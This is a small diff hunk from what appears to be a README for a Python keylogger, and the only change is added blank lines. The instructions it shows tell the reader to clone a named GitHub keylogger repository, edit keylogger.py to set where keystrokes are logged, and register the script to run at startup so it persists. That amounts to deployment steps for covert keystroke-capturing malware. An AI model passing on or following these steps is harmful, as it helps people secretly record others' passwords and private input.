@@ -4,9 +4,13 @@ This keylogger was not written by me. Original link in the end. I am just statin
 
 # Instructions
 Follow the steps:
+
 git clone https://github.com/ramansarda2000/Key-Logger.git
+
 cd Key-Logger
+
 nano keylogger.py
+
 Now edit the log files address to the file you want.
 
 Now add a command to run this python file as a startup application.
